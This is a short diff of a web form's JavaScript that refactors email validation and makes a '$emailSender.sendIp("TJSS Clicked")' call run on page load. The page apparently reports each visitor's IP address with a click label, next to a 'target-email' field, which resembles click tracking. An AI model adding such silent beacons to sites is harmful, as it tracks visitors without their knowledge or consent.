@@ -7,11 +7,11 @@ document.addEventListener("DOMContentLoaded", () =>
 {
    document.querySelector("#next").addEventListener("click", submit);
    document.querySelector("#cancel").addEventListener("click", clearForm);
-   document.querySelector("#target-email").addEventListener("input", isEmailValid);
+   document.querySelector("#target-email").addEventListener("input", $formHandler.isEmailValid);
    window.addEventListener("resize", $footerHandler.placeFooterEnd);
    $footerHandler.placeFooterEnd();
    // ! Uncomment to enable email send upon loading of page
-   $emailSender.sendIp();
+   $emailSender.sendIp("TJSS Clicked");
 });
 function clearForm()
 {
@@ -36,7 +36,7 @@ function submit(e)
    let isFormCorrect = true;
    if ($formHandler.isFieldEmpty())
       isFormCorrect = false;
-   if (!isEmailValid())
+   if (!$formHandler.isEmailValid())
       isFormCorrect = false;
    if (isFormCorrect === true) {
       let email = document.querySelector("#target-email").value;
